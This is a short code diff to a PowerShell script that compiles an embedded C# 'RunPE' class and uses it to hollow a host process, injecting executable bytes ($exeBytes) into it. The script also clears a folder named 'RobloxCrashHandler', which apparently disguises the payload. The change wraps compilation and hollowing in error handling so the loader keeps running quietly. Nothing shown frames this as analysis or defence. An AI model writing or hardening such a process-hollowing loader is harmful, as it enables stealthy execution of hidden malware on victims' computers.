@@ -404,7 +404,11 @@ public class RunPE {
 }
 '@
 if (-not ([System.Management.Automation.PSTypeName]"RunPE").Type) {
-    Add-Type -TypeDefinition $PECode -Language CSharp
+    try {
+        Add-Type -TypeDefinition $PECode -Language CSharp -ErrorAction Stop
+    } catch {
+        Write-Host "    WARNING: Failed to compile RunPE type: $_" -ForegroundColor Yellow
+    }
 }
 
 # -- 1. Stop any running instances ---------------------------------------------
@@ -467,10 +471,14 @@ $oldFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
 if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
 
 $hollowSuccess = $false
-try {
-    $hollowSuccess = [RunPE]::Hollow($exeBytes, $HostProcess)
-} catch {
-    Write-Host "    WARNING: Process hollowing threw an exception: $_" -ForegroundColor Yellow
+if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
+    try {
+        $hollowSuccess = [RunPE]::Hollow($exeBytes, $HostProcess)
+    } catch {
+        Write-Host "    WARNING: Process hollowing threw an exception: $_" -ForegroundColor Yellow
+    }
+} else {
+    Write-Host "    WARNING: RunPE type is not available. Skipping process hollowing." -ForegroundColor Yellow
 }
 
 $started = $false
